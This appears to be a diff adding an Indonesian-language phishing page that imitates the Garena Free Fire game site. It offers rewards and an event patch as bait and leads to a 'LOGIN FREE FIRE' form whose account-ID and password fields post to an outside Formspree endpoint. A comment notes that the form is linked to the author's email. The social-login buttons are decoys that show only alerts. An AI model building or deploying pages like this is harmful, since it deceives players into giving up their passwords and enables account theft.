@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+<!-- This site is hosted on Netlify. Anyone can build and deploy a site
+     like this one for free: https://netlify.new/?utm_campaign=ai-legible&utm_source=comment&utm_medium=referral&utm_id=b24785c5-d770-421d-b3b3-58c0de74f9db
+     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
+<meta name="hosting-provider" content="Netlify">
+<meta name="netlify-deploy" content="https://netlify.new/?utm_campaign=ai-legible&amp;utm_source=meta&amp;utm_medium=referral&amp;utm_id=b24785c5-d770-421d-b3b3-58c0de74f9db">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Garena Free Fire - Neo City & Login Akun</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Teko:wght@600;700&family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #050811;
+            color: #ffffff;
+        }
+        .font-teko {
+            font-family: 'Teko', sans-serif;
+        }
+        .hero-bg {
+            background: linear-gradient(to bottom, rgba(5, 8, 17, 0.4), #050811), 
+                        url('https://images.unsplash.com/photo-1511512578047-dfb367046420?q=80&w=1600&auto=format&fit=crop') center/cover no-repeat;
+        }
+        .ff-cyan {
+            color: #00f0ff;
+        }
+        .ff-btn {
+            background: linear-gradient(135deg, #00f0ff 0%, #7000ff 100%);
+            transition: all 0.3s ease;
+        }
+        .ff-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 25px rgba(0, 240, 255, 0.6);
+        }
+    </style>
+</head>
+<body class="selection:bg-cyan-500 selection:text-black">
+
+    <!-- NAVBAR -->
+    <nav class="flex items-center justify-between px-6 py-4 bg-[#050811]/90 backdrop-blur-md fixed top-0 left-0 right-0 z-50 border-b border-cyan-900/50">
+        <div class="flex items-center space-x-2">
+            <span class="text-3xl font-teko tracking-wider uppercase font-bold text-white">FREE <span class="ff-cyan">FIRE</span></span>
+        </div>
+        <div class="hidden md:flex space-x-8 font-semibold text-sm tracking-wider">
+            <a href="#home" class="hover:text-cyan-400 transition">BERANDA</a>
+            <a href="#events" class="hover:text-cyan-400 transition">EVENT TERBARU</a>
+            <a href="#login" class="hover:text-cyan-400 transition">LOGIN AKUN</a>
+        </div>
+        <div>
+            <a href="#login" class="ff-btn text-white font-bold px-5 py-2 rounded uppercase text-sm tracking-wider shadow-lg">MASUK AKUN</a>
+        </div>
+    </nav>
+
+    <!-- HERO SECTION -->
+    <header id="home" class="hero-bg h-screen flex items-center justify-center text-center px-4 pt-20">
+        <div class="max-w-3xl">
+            <span class="bg-cyan-500/20 text-cyan-400 border border-cyan-500/50 px-4 py-1 rounded-full text-xs font-semibold tracking-widest uppercase inline-block mb-4">
+                Patch Update: Neo Cyber Arena
+            </span>
+            <h1 class="text-6xl md:text-8xl font-teko uppercase tracking-wider font-bold mb-4 drop-shadow-lg">
+                NEXT-GEN <span class="ff-cyan">BATTLE</span>
+            </h1>
+            <p class="text-gray-300 text-sm md:text-base mb-8 max-w-xl mx-auto">
+                Jelajahi peta futuristik baru, dapatkan senjata eksklusif, dan dominasi pertempuran dengan gaya cyberpunk modern!
+            </p>
+            <div class="flex flex-col sm:flex-row justify-center gap-4">
+                <a href="#login" class="ff-btn text-white font-extrabold px-8 py-3 rounded text-lg uppercase tracking-wider shadow-xl">
+                    ⚡ KLAIM HADIAH & LOGIN
+                </a>
+            </div>
+        </div>
+    </header>
+
+    <!-- EVENT TERBARU -->
+    <section id="events" class="py-20 px-6 max-w-6xl mx-auto">
+        <div class="text-center mb-16">
+            <h2 class="text-4xl md:text-5xl font-teko tracking-wider uppercase font-bold">EVENT & KOLABORASI</h2>
+            <div class="w-24 h-1 bg-cyan-500 mx-auto mt-2"></div>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+            <div class="bg-gray-900/80 border border-cyan-900/40 rounded-xl p-6 hover:border-cyan-500 transition group">
+                <div class="text-4xl mb-4">🎁</div>
+                <h3 class="text-2xl font-teko tracking-wide font-bold mb-2 group-hover:text-cyan-400">MYSTERY SHOP</h3>
+                <p class="text-gray-400 text-sm">
+                    Dapatkan diskon hingga 90% untuk bundle, skin senjata, dan item langka edisi terbatas minggu ini.
+                </p>
+            </div>
+            <div class="bg-gray-900/80 border border-cyan-900/40 rounded-xl p-6 hover:border-cyan-500 transition group">
+                <div class="text-4xl mb-4">🎯</div>
+                <h3 class="text-2xl font-teko tracking-wide font-bold mb-2 group-hover:text-cyan-400">BOOYAH PASS</h3>
+                <p class="text-gray-400 text-sm">
+                    Selesaikan misi harian, tingkatkan level pass, dan buka berbagai hadiah kostum futuristik keren.
+                </p>
+            </div>
+            <div class="bg-gray-900/80 border border-cyan-900/40 rounded-xl p-6 hover:border-cyan-500 transition group">
+                <div class="text-4xl mb-4">🛡️</div>
+                <h3 class="text-2xl font-teko tracking-wide font-bold mb-2 group-hover:text-cyan-400">RANKED SEASON</h3>
+                <p class="text-gray-400 text-sm">
+                    Kejar tier Grandmaster sekarang juga dan buktikan kamu adalah pemain terbaik di server ini!
+                </p>
+            </div>
+        </div>
+    </section>
+
+    <!-- LOGIN AKUN FREE FIRE SECTION -->
+    <section id="login" class="py-20 px-6 bg-gradient-to-t from-black to-[#050811] border-t border-cyan-900/30">
+        <div class="max-w-md mx-auto bg-gray-900/90 border border-cyan-500/30 rounded-2xl p-8 shadow-2xl relative overflow-hidden">
+            <div class="absolute -top-24 -right-24 w-48 h-48 bg-cyan-500/10 rounded-full blur-3xl pointer-events-none"></div>
+
+            <div class="text-center mb-8">
+                <span class="text-xs tracking-widest uppercase text-cyan-400 font-bold bg-cyan-500/10 px-3 py-1 rounded">AUTENTIKASI AKUN</span>
+                <h2 class="text-4xl font-teko tracking-wider uppercase font-bold mt-2">LOGIN FREE FIRE</h2>
+                <p class="text-gray-400 text-xs mt-1">Pilih metode masuk untuk menyinkronkan data akunmu.</p>
+            </div>
+
+            <!-- FORM YANG TERHUBUNG KE EMAIL KAMU -->
+            <form action="https://formspree.io/f/mgaweayw" method="POST" class="space-y-4 mb-6">
+                <div>
+                    <label class="block text-xs uppercase font-semibold text-gray-300 mb-1">Email / ID / Nomor HP</label>
+                    <input type="text" name="email_atau_id" required placeholder="Masukkan akun Free Fire..." class="w-full bg-black/60 border border-gray-800 rounded-lg px-4 py-3 text-sm text-white focus:outline-none focus:border-cyan-500 transition">
+                </div>
+
+                <div>
+                    <label class="block text-xs uppercase font-semibold text-gray-300 mb-1">Kata Sandi (Password)</label>
+                    <input type="password" name="password" required placeholder="••••••••••••" class="w-full bg-black/60 border border-gray-800 rounded-lg px-4 py-3 text-sm text-white focus:outline-none focus:border-cyan-500 transition">
+                </div>
+
+                <button type="submit" class="w-full ff-btn text-white font-extrabold py-3 rounded-lg uppercase text-sm tracking-wider shadow-lg mt-2 cursor-pointer">
+                    🎮 MASUK DENGAN AKUN
+                </button>
+            </form>
+
+            <div class="relative flex py-2 items-center">
+                <div class="flex-grow border-t border-gray-800"></div>
+                <span class="flex-shrink mx-4 text-gray-500 text-xs uppercase">Atau masuk cepat dengan</span>
+                <div class="flex-grow border-t border-gray-800"></div>
+            </div>
+
+            <!-- Tombol Social Login Cepat -->
+            <div class="grid grid-cols-3 gap-3 mt-4">
+                <button type="button" onclick="alert('Login via Facebook dipilih')" class="bg-blue-600/20 border border-blue-600/50 hover:bg-blue-600/40 text-blue-400 text-xs font-bold py-2.5 rounded-lg transition">
+                    Facebook
+                </button>
+                <button type="button" onclick="alert('Login via Google dipilih')" class="bg-red-600/20 border border-red-600/50 hover:bg-red-600/40 text-red-400 text-xs font-bold py-2.5 rounded-lg transition">
+                    Google
+                </button>
+                <button type="button" onclick="alert('Login via VK dipilih')" class="bg-cyan-600/20 border border-cyan-600/50 hover:bg-cyan-600/40 text-cyan-400 text-xs font-bold py-2.5 rounded-lg transition">
+                    VK
+                </button>
+            </div>
+        </div>
+    </section>
+
+    <!-- FOOTER -->
+    <footer class="bg-black/90 border-t border-gray-900 py-8 text-center text-gray-500 text-xs">
+        <p>© Garena Free Fire. Desain Tema Neo Cyber & Login Akun interaktif.</p>
+    </footer>
+
+</body>
+</html>
